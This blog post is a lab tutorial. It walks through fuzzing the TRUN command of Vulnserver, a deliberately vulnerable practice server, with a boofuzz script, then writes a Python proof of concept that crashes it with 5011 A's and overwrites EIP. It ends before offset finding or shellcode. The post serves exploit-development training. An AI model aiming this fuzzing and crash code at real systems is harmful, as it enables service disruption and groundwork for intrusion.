---
layout: single
title: Boofuzz to EIP Overwrite
date: 2019-5-24
classes: wide
header:
  teaser: /assets/images/CTP/1920x1080_Wallpaper.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will become acquainted with the `boofuzz` fuzzer and use it to discover an EIP overwrite vulnerability in Vulnserver. 

## Preparing Our Environment

For this excercise we will need to procure:
+ Windows 7 VM,
+ boofuzz,
+ vulnserver, 
+ Immunity Debugger,
+ Mona, and
+ a remote attacker box (I'll be using Kali).

### Windows 7 VM
For my lab setup, I downloaded an x86 Windows 7 image for Virtualbox [directly from Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) and took a snapshot so that in 90 days, if I still want the VM I won't have to start the process of installing and configuring it from scratch! 

I found that when I downloaded and booted the 'VMware x86' images, they were in fact 64-bit, so beware of that possibility. 

### Boofuzz
Next we will need to install `boofuzz` on our attacker box. If you are on a Debian-based Linux machine, you can run the following commands (if you do not have `pip` installed, first run `apt-get install python-pip`):
1. `git clone https://github.com/jtpereyda/boofuzz`
2. `cd boofuzz`
3. `pip install .`

You can read more about `boofuzz` installation and documentation [here](https://boofuzz.readthedocs.io/en/latest/user/install.html).

### Vulnserver
Now we need our badly written application. I downloaded and used the `.zip` hosted [here](http://sites.google.com/site/lupingreycorner/vulnserver.zip) from my Windows 7 VM, but feel free to download directly from the autor [here](https://github.com/stephenbradshaw/vulnserver). 

The `.exe` will run as long as its companion `essfunc.dll` file is in the same location. I moved both to my desktop for ease of use in the Windows 7 VM. 

### Immunity Debugger
Next we will download our debugger which we will use to investigate how vulnserver is behaving under different circumstances. Access the [download link](https://debugger.immunityinc.com/ID_register.py) from your Windows 7 VM, and fill out the requisite information (I believe dummy data will suffice.) Once you start the installer, it will notice that you do not have Python installed and offer to install it for you. 

### Mona
Mona is a very robust Python tool that can be used inside Immunity to perform a broad range of analysis for us. To install Mona, I just visited the [Corelan Mona repo](https://github.com/corelan/mona/blob/master/mona.py) and copied the raw text to a txt document inside my Windows 7 VM and saved it as `mona.py`. 

We want `mona.py` to be saved in the following directory: `C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands`. 

## Exploring Vulnserver
The first thing we want to do is run vulnserver.exe and then interact with the application as a normal client to determine how the application works under normal circumstances. We don't need to run the process in Immunity just yet. Start the application and you should recieve the following Windows prompt:

![](/assets/images/CTP/vulnserver.JPG)

Next, we want to interact with the listening service from our attacker and determine how the application is supposed to work. We can use `netcat` for this and we'll just make a simple TCP connection to the target with the following command: 
```terminal_session
nc <windows7 IP address> 9999
```

Immediately we see that the connection is made and that the server is offering us the `HELP` command to show us valid commands for the service. Once we send the `HELP` command we get the following output:

![](/assets/images/CTP/netcat.JPG)

Seeing that the valid argument structure for each command is roughly `<command>[space]<command_value>` we can send something like `TRUN hello` as a test and see if it's accepted. 

![](/assets/images/CTP/trun.JPG)

We can see that the command and argument executed successfully. Now that we have confirmed the structure of a command and its arguments, we can start fuzzing this command to see if we can get the program to crash when submitting various argument values to the `TRUN` command. 

## Using Boofuzz
Working off of a very detailed and helpful working aid from [zeroaptitude.com](https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/), we learn that the first element of any `boofuzz` fuzzing script is the 'session.' (For this excercise I worked directly out of the `boofuzz` directory.)

The purpose of the session is to establish a named entity which details: the host we want to connect to, the port we want to connect to, and the parameters we want to fuzz.

Let's establish our `boofuzz` script skeleton:
```python
#!/usr/bin/python

from boofuzz import *


def main():
 
        
if __name__ == "__main__":
    main()
```

This skeleton, once it includes a 'session', will be our template for all of our subsequent fuzzing scripts. The session will be defined in the `main()` function and will establish a variable named `session` which will comprise a few global variables, namely: `host` and `port` for this excercise. Let's see our code below:
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("TRUN")	#just giving our session a name, "TRUN"

    	s_string("TRUN", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "TRUN" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now.
 
        
if __name__ == "__main__":
    main()
```

Excellent, we have the first crucial piece to our `boofuzz` puzzle. Now we just need to add a couple lines to join our session with our actual fuzzing functions, we can accomplish this by appending the following two lines to our code:
```python
session.connect(s_get("TRUN"))		#having our 'session' variable connect following the guidelines we established in "TRUN"
session.fuzz()				#calling this function actually performs the fuzzing
```

Our complete code now looks like this: 
```python
#!/usr/bin/python

from boofuzz import *

host = '192.168.1.201'	#windows VM
port = 9999		#vulnserver port

def main():
	
	session = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')))
	
	s_initialize("TRUN")	#just giving our session a name, "TRUN"

    	s_string("TRUN", fuzzable = False)	#these strings are fuzzable by default, so here instead of blank, we specify 'false'
    	s_delim(" ", fuzzable = False)		#we don't want to fuzz the space between "TRUN" and our arg
   	s_string("FUZZ")			#This value is arbitrary as we did not specify 'False' for fuzzable. Boofuzz will fuzz this string now
 
        session.connect(s_get("TRUN"))		#having our 'session' variable connect following the guidelines we established in "TRUN"
    	session.fuzz()				#calling this function actually performs the fuzzing

if __name__ == "__main__":
    main()
```

Since we want to determine how the application reacts to our fuzzing script, we need to start the `vulnserver.exe` in Immunity. This is easily accomplished by dragging the `vulnserver.exe` icon on the desktop to the Immunity icon which will automatically open Immunity with the `vulnserver.exe` process attached. If you have never used Immunity before, do not worry, there are a ton of great guides online and I will be linking themn in the resources section. 

One thing to know is that when you attach a process to Immunity in the way we just described, the process is not actually running yet. We need to press the small red 'play' triangle to start the process as if we just double-clicked it on the desktop. Immunity even gives us a terminal prompt as if we were running vulnserver on it's own. 

Red 'play' triangle in lower right hand side of image:

![](/assets/images/CTP/triangle.JPG)

If you notice, in the bottom right hand side of Immunity, there is a yellow and red message `Paused` indicating that the process is not running. After pressing the play symbol (alternatively, you can use the `F9` key to start the process), we need to run our python script from our attacker to begin fuzzing the application. 

If we see at any point that Immunity gives us an `Access Violation` error message at the bottom, we know that the program has crashed due to our fuzzing and we can stop our fuzzer script on our attacker. 

We see pretty quickly that our fuzzer has crashed the application. After stopping our script, we examine the `Registers (FPU)` pane in Immunity and see that several locations now hold references to our payload of `41` which is the hexidecimal representation of a capital `A`. This means that whenever we send our payload, it is written into these locations in memory on the victim. We notice that `EAX`, `ESP`, `EBP`, and `EIP` all contain references to our long string of `A` with `EAX` also sporting a preprended `TRUN /.:/` string. 

![](/assets/images/CTP/aaa.JPG)

Essentially what we have discovered at this point is that, we are able to subvert the expected application input in a way that allows to take control of the value of `EIP`. `EIP`'s job is to contain the address in memory of the next instruction to be executed. So if we can tell the process where to go, we can tell it what to execute. If we can tell it what to execute, there is a chance we can get it to execute a malicious payload. 

## Exploiting the EIP Overwrite

Well, we know at this point that we can affect the value of `EIP`, but what we don't know, is how far into our payload of `A` the `EIP` overwrite occurred. We don't even know how many bytes of data we sent to the application at this point, we kind of just hit a giant Fuzz Button and watched our application crash. Luckily, `boofuzz` stores some useful information for us in a sql-lite type db in the `boofuzz-results` directory after each session. Opening the relevant session in the gui as follows: 

![](/assets/images/CTP/results.JPG)

In entry 15, we see our familiar string `TRUN /.:` and the entry above it, 14, states that `boofuzz` sent 5011 bytes:

![](/assets/images/CTP/5011.JPG)

What we'll do now is, create our exploit skeleton in python and test to see if sending 5011 bytes worth of `A` results in us getting the same `41414141` value overwritten to `EIP`. 

### exploitSkeleton.py

We can craft up a skeleton exploit that we can stash away for later use and edit copies of as we need them throughout this series. Our exploit skeleton will be the following:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "<host IP>"
port = <host PORT>

buffer = "<string we want to send>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send(buffer)
print s.recv(1024)
s.close()
```

Let's edit this code to match our exact situation by changing the `host`, `port`, and `buffer` variables. Let's also keep in mind that the fuzzer prepended our fuzz-string with `TRUN /.:/ ` so it's not just as simple as multiplying `A` by 5011. We have to prepend our `TRUN` argument as well. Our final payload should look something like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = "A" * 5011

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("TRUN /.:/ " + buffer)
print s.recv(1024)
s.close()
```

Running this python script with vulnserver attached in Immunity nets us the same `Registers (FPU)` panel, excellent. So we know for certain that we can overwrite `EIP`. The next step is to determine how far into our string of 5011 `A` the overwrite occurs. 

To determine this, we can leverage Mona's ability to create a "cyclical" string of data which never repeats any patterns. This string of data will overwrite `EIP` and provide us with an exact location of where in our string the overwrite occurred since we'll have a reference point to a unique set of 4 hex characters. 

To make Mona create our string, we use the following command in the white bar at the bottom of the Immunity GUI:
`!mona pc 5011` ('pc' is short for 'pattern-create' and there are multiple scripts and tools out there that will perform this for you, including Metasploit. I prefer using Mona since I'm already in Immunity. 

![](/assets/images/CTP/pc.JPG)

Mona outputs this string (use the ASCII one) to a file called `pattern.txt` which is located in the `C:\Program Files\Immunity Inc\Immunity Debugger` directory. Make sure you copy the string from this file and not the pane in Immunity as the string in the pane might be truncated (especially at 5000 bytes). This string now becomes our buffer and we feed it back to a restarted vulnserver process in Immunity. 

--To Be Continued--
